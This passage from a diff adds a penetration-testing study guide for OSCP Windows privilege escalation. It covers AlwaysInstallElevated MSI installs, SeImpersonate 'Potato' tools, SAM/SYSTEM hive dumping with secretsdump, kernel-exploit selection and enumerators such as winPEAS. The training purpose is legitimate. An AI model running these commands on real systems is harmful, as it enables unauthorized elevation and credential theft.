+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre>
+<p>Both values must be <code>0x1</code>:</p>
+<pre><code class="language-cmd">msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi
+</code></pre>
+<blockquote>
+<p>One key or a zero value disproves the route. This is an unsafe installer policy, not a universal UAC bypass.</p>
+</blockquote>
+<pre><code class="language-cmd">whoami /groups
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+</code></pre>
+<blockquote>
+<p>A UAC bypass normally elevates an already-administrative filtered token. Build/policy-specific bypasses are not a baseline path for a standard user.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-8">7. Worked example — hypothetical</h3>
+<p>Observation: only the machine installer value is enabled. Test: check the user policy and actual token. Illustrative output: user policy is absent. Interpretation: the elevated-installer route is not enabled; investigate another privileged consumer.</p>
+<h3 id="8-verify-the-result-8">8. Verify the result</h3>
+<p>Verify both relevant conditions and actual resulting token; keep UAC-context claims narrower than full privilege escalation.</p>
+<h3 id="9-failure-and-fallback-8">9. Failure and fallback</h3>
+<p>One policy value, blocked MSI execution or an incompatible protected token defeats the assumed route.</p>
+<h3 id="10-next-transitions-8">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-token">Select a privilege-backed impersonation or object-control route</a>; <a href="/oscp/notes/methods/sessions-transfers/#payload-generate">Generate a payload matching OS, process, format and handler</a>.</p>
+<p><a id="windows-token"></a></p>
+<h2 id="select-a-privilege-backed-impersonation-or-object-control-route">Select a privilege-backed impersonation or object-control route</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#9-token-privilege-routes">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-9">1. Purpose and result</h3>
+<p>A verified token-backed identity or privileged-object operation.</p>
+<h3 id="2-recognition-clues-9">2. Recognition clues</h3>
+<p>whoami /priv exposes a relevant token privilege.</p>
+<h4 id="find-the-clue-from-your-starting-access-9">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect the current token's privileges, then map a relevant privilege to an actual protected operation and available source/trigger.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-cmd">whoami /priv
+whoami /all
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
+</code></pre>
+<p><strong>Recognize this detail:</strong> An impersonation capability is present; the privileged authentication source required by a specific tool is not established.</p>
+<p><strong>Still missing before method selection:</strong> Read whoami /priv and whoami /all. Match the exact privilege, enabled state and token context to the technique's required API/trigger, then verify the resulting identity; the privilege name alone is not SYSTEM.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The required source and privileged token operation work: select that compatible method.</td></tr><tr><td>Ruled out in this context</td><td>The required authentication service/source is unavailable: reject that tool's chain.</td></tr><tr><td>Inconclusive</td><td>Privilege presence alone leaves exploit selection unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-9">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> The exact privilege and usable operation; impersonation additionally needs a compatible privileged authentication source, OS/service state and executable context.</p>
+<h3 id="4-discover-and-verify-prerequisites-9">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">whoami /priv
+whoami /all
+</code></pre>
+<h3 id="5-why-it-works-9">5. Why it works</h3>
+<p>SeImpersonate, backup/restore, debug, ownership and driver privileges enable different operations. A privilege name does not guarantee a particular exploit tool or a privileged token source.</p>
+<h3 id="6-execute-and-choose-variants-9">6. Execute and choose variants</h3>
+<pre><code class="language-cmd">whoami /priv
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Privilege</th><th>Required next proof</th></tr></thead><tbody><tr><td><code>SeImpersonatePrivilege</code></td><td>Compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation</td></tr><tr><td><code>SeAssignPrimaryTokenPrivilege</code></td><td>Useful primary token plus process/quota requirements</td></tr><tr><td><code>SeBackupPrivilege</code></td><td>Enabled privilege, backup-aware read and useful protected data</td></tr><tr><td><code>SeRestorePrivilege</code></td><td>Restore-aware write plus privileged consumer/trigger</td></tr><tr><td><code>SeDebugPrivilege</code></td><td>Usable target process and no protected-process barrier</td></tr><tr><td><code>SeLoadDriverPrivilege</code></td><td>Compatible signed/loadable driver and stable exploit path</td></tr><tr><td><code>SeTakeOwnershipPrivilege</code></td><td>Ownership change, then DACL/content control and consumer</td></tr></tbody></table>
+<details>
+<summary><strong>Impersonation-tool variants</strong></summary>
+<pre><code class="language-cmd">PrintSpoofer64.exe -i -c "cmd.exe"
+</code></pre>
+<pre><code class="language-cmd">GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt"
+</code></pre>
+<blockquote>
+<p>Choose by OS build, architecture, runtime and available trigger. A privilege name alone does not select a working “Potato.” Success is a SYSTEM process/effect followed by <code>whoami /all</code>; connection/token/process errors route back to prerequisites.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>Backup privilege to local credential material</strong></summary>
+<pre><code class="language-cmd">reg save HKLM\SAM C:\Windows\Temp\SAM.hive
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
+</code></pre>
+<pre><code class="language-bash">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+</code></pre>
+<blockquote>
+<p>Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization; classify and validate it through the credential procedure.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-9">7. Worked example — hypothetical</h3>
+<p>Observation: SeImpersonatePrivilege is present. Test: match a documented tool's service/build/trigger requirements to the host. Illustrative output: the required privileged authentication source is unavailable. Interpretation: reject that tool's route while retaining the privilege observation.</p>
+<h3 id="8-verify-the-result-9">8. Verify the result</h3>
+<p>Verify the resulting token or concrete protected-object operation, not the tool's success text.</p>
+<h3 id="9-failure-and-fallback-9">9. Failure and fallback</h3>
+<p>Missing token source, filtered token, protected process or driver-signing/build differences change the route; inspect the specific prerequisite.</p>
+<h3 id="10-next-transitions-9">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-backup">Use backup privilege to obtain protected local credential material</a>; <a href="/oscp/notes/methods/ad-identities/#ad-lsass">Obtain accessible live logon-session credential material</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-kernel">Select a matching application, driver or kernel exploit</a>.</p>
+<p><a id="windows-backup"></a></p>
+<h2 id="use-backup-privilege-to-obtain-protected-local-credential-material">Use backup privilege to obtain protected local credential material</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-10">1. Purpose and result</h3>
+<p>Matched credential material suitable for offline parsing.</p>
+<h3 id="2-recognition-clues-10">2. Recognition clues</h3>
+<p>A token has the relevant backup rights and protected registry/files are a useful credential source.</p>
+<h4 id="find-the-clue-from-your-starting-access-10">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect the actual token for backup-related rights and distinguish a privilege-aware read API from an ordinary file copy.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-cmd">whoami /priv
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">SeBackupPrivilege   Back up files and directories   Disabled
+</code></pre>
+<p><strong>Recognize this detail:</strong> The privilege is assigned but initially disabled; permitted software may enable it for backup-semantic reads.</p>
+<p><strong>Still missing before method selection:</strong> Check that the privilege can actually be used, supporting API/context, complete matched source set and writable output.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>A permitted backup-aware operation produces matched protected source files: select offline extraction.</td></tr><tr><td>Ruled out in this context</td><td>The token has no required privilege and no alternate read permission: reject this backup route.</td></tr><tr><td>Inconclusive</td><td>Ordinary copy denial does not settle a backup-semantic operation; verify the API rather than inferring absence.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-10">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Usable backup privilege, compatible backup API/command and a matched protected source set with a writable destination.</p>
+<h3 id="4-discover-and-verify-prerequisites-10">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">whoami /priv
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+</code></pre>
+<h3 id="5-why-it-works-10">5. Why it works</h3>
+<p>Backup-mode read access can bypass ordinary read ACLs through supporting APIs; it does not grant arbitrary execution. Matched registry hives supply the key material required for credential parsing.</p>
+<h3 id="6-execute-and-choose-variants-10">6. Execute and choose variants</h3>
+<details>
+<summary><strong>Backup privilege to local credential material</strong></summary>
+<pre><code class="language-cmd">reg save HKLM\SAM C:\Windows\Temp\SAM.hive
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
+</code></pre>
+<pre><code class="language-bash">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+</code></pre>
+<blockquote>
+<p>Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization; classify and validate it through the credential procedure.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-10">7. Worked example — hypothetical</h3>
+<p>Observation: a backup-capable account cannot directly read a protected file. Test: use the documented privilege-aware hive-save route. Illustrative output: matched SAM/SYSTEM files are obtained. Interpretation: parse offline and classify the resulting local hashes.</p>
+<h3 id="8-verify-the-result-10">8. Verify the result</h3>
+<p>Verify complete matched source artifacts and exact account mapping after parsing.</p>
+<h3 id="9-failure-and-fallback-10">9. Failure and fallback</h3>
+<p>Ordinary file-copy denial does not disprove backup semantics; missing required hives or protection can still prevent useful extraction.</p>
+<h3 id="10-next-transitions-10">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/ad-identities/#ad-sam">Extract local account hashes from matched SAM and SYSTEM</a>; <a href="/oscp/notes/methods/credentials/#nt-hash">Recover or reuse an NT password hash</a>; <a href="/oscp/notes/methods/credentials/#credential-classify">Classify the artifact and its identity context</a>.</p>
+<p><a id="windows-kernel"></a></p>
+<h2 id="select-a-matching-application-driver-or-kernel-exploit">Select a matching application, driver or kernel exploit</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#10-application-driver-and-kernel-candidates">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-11">1. Purpose and result</h3>
+<p>A justified local exploit and independently verified higher-privilege result.</p>
+<h3 id="2-recognition-clues-11">2. Recognition clues</h3>
+<p>An exact vulnerable local component is present after simpler paths are assessed.</p>
+<h4 id="find-the-clue-from-your-starting-access-11">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Collect OS build/patch and relevant installed driver/application versions before comparing any local-exploit requirement.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Get-ComputerInfo | Select-Object OsBuildNumber,OsArchitecture
+Get-HotFix
+Get-CimInstance Win32_SystemDriver | Select-Object Name,State,PathName
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">OS build: BUILD
+Driver: DRIVER_NAME at DRIVER_PATH
+Affected driver version: not yet established
+</code></pre>
+<p><strong>Recognize this detail:</strong> The exact component/build is the candidate evidence; an OS-family name or one missing KB is insufficient.</p>
+<p><strong>Still missing before method selection:</strong> Verify vendor patch state, required driver/service/feature, architecture and PoC assumptions.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The affected configuration and compatible reviewed artifact are confirmed: select the bounded exploit test.</td></tr><tr><td>Ruled out in this context</td><td>The driver/feature is absent or the installed version is fixed: reject that candidate.</td></tr><tr><td>Inconclusive</td><td>An incomplete update inventory leaves vulnerability unconfirmed.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-11">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Affected build/patch/architecture, required service/driver/configuration and compatible exploit assumptions.</p>
+<h3 id="4-discover-and-verify-prerequisites-11">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber
+Get-HotFix
+Get-CimInstance Win32_SystemDriver | Select-Object Name,State,PathName
+</code></pre>
+<h3 id="5-why-it-works-11">5. Why it works</h3>
+<p>OS family names and missing-update lists are candidate evidence. Vendor patch state, driver version and mitigations determine applicability.</p>
+<h3 id="6-execute-and-choose-variants-11">6. Execute and choose variants</h3>
+<pre><code class="language-powershell">Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
+                 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
+  Select-Object DisplayName,DisplayVersion,Publisher,InstallLocation
+</code></pre>
+<pre><code class="language-cmd">systeminfo
+driverquery /v
+</code></pre>
+<blockquote>
+<p>Prefer deterministic credential/permission/configuration paths. Then verify exact privileged application or driver version/configuration. Use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. Avoid <code>Win32_Product</code>; it is slow and can trigger MSI repair.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-11">7. Worked example — hypothetical</h3>
+<p>Observation: an enumerator names a driver exploit. Test: inspect the installed driver version and exploit requirements. Illustrative output: the required driver is absent. Interpretation: reject the route and return to permission/application evidence.</p>
+<h3 id="8-verify-the-result-11">8. Verify the result</h3>
+<p>Verify target hostname and resulting effective token; preserve reviewed PoC modifications privately.</p>
+<h3 id="9-failure-and-fallback-11">9. Failure and fallback</h3>
+<p>A crash or compilation success does not prove escalation. Wrong build, missing driver or mitigations require another supported path.</p>
+<h3 id="10-next-transitions-11">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/public-exploits/#exploit-select">Match a public exploit to the actual component and configuration</a>; <a href="/oscp/notes/methods/public-exploits/#exploit-compile">Compile and minimally adapt an existing native or memory-corruption PoC</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<p><a id="windows-enumerators"></a></p>
+<h2 id="turn-automated-windows-findings-into-manually-verified-candidates">Turn automated Windows findings into manually verified candidates</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#11-automated-candidate-generation">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-12">1. Purpose and result</h3>
+<p>A shortlist of permissions, consumers and credential sources to validate.</p>
+<h3 id="2-recognition-clues-12">2. Recognition clues</h3>
+<p>A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials.</p>
+<h4 id="find-the-clue-from-your-starting-access-12">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Select a reviewed tool after checking host/runtime; treat each highlighted service, token or path as a lead to native evidence.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">whoami /all
+$PSVersionTable
+$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Tool candidate: unquoted SERVICE path
+Writable earlier prefix: not checked
+Trigger: not checked
+</code></pre>
+<p><strong>Recognize this detail:</strong> The enumerator located a configuration clue, not the full usable chain.</p>
+<p><strong>Still missing before method selection:</strong> Run winPEAS with log output, then inspect the exact reported service with sc qc/sc sdshow and its file with icacls. Check token highlights with whoami /priv. A collector's colored line is not the resulting elevated token.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The native checks establish the complete method conditions: select its owning route.</td></tr><tr><td>Ruled out in this context</td><td>Protected prefixes or a low consumer disprove the proposed elevation: discard the finding's exploit interpretation.</td></tr><tr><td>Inconclusive</td><td>Tool blocking/partial visibility leaves enumeration incomplete; use native/application-specific checks.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-12">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Verified current token and architecture, a compatible reviewed executable or allowed PowerShell runtime, and a writable report location.</p>
+<h3 id="4-discover-and-verify-prerequisites-12">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">whoami /all
+$PSVersionTable
+$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<h3 id="5-why-it-works-12">5. Why it works</h3>
+<p>winPEAS, PrivescCheck, Seatbelt and PowerUp collect different evidence. Highlighted services or privileges still require exact ACL, token, identity and trigger checks.</p>
+<h3 id="6-execute-and-choose-variants-12">6. Execute and choose variants</h3>
+<pre><code class="language-cmd">winPEASx64.exe log
+Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt"
+Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json"
+</code></pre>
+<pre><code class="language-powershell">powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML"
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+</code></pre>
+<blockquote>
+<p>winPEAS is broad; Seatbelt is a targeted survey and publishes source rather than official binaries; PrivescCheck evaluates the current token and skips some checks when elevated; PowerUp is useful but its upstream repository was archived. AV/script-policy failure is a tooling limitation—use native checks.</p>
+</blockquote>
+<p>Convert every highlight into:</p>
+<pre><code class="language-text">CANDIDATE | CURRENT TOKEN | CONTROLLED INPUT | EFFECTIVE RIGHT | CONSUMER | RUN-AS | TRIGGER | EXPECTED EFFECT | STATUS
+</code></pre>
+<h3 id="7-worked-example--hypothetical-12">7. Worked example — hypothetical</h3>
+<p>Observation: a scanner flags an unquoted path. Test: inspect the earlier path prefixes and trigger. Illustrative output: none is writable. Interpretation: discard the exploit hypothesis and retain the configuration fact.</p>
+<h3 id="8-verify-the-result-12">8. Verify the result</h3>
+<p>Read out.txt or the helper report. Use sc.exe qc/sdshow plus icacls for a service, inspect task XML/run-as for a scheduled task, or check whoami /priv for a token finding</p>
+<h3 id="9-failure-and-fallback-12">9. Failure and fallback</h3>
+<p>Binary/script blocked or report empty: check architecture and PowerShell language/policy, then use native service/task/ACL checks. A blocked helper does not disprove the finding</p>
+<h3 id="10-next-transitions-12">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-service-config">Change a privileged service's executable configuration</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-token">Select a privilege-backed impersonation or object-control route</a>.</p>
+<h2 id="sources-and-shared-concepts">Sources and shared concepts</h2>
+<p>Supplied PEN-200 Ch 17 pp494–549. <a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/windows">Hexdump Windows modules</a>; Microsoft access-control, service and token sources remain beside the operational procedure.</p>
+<p>Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.</p></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
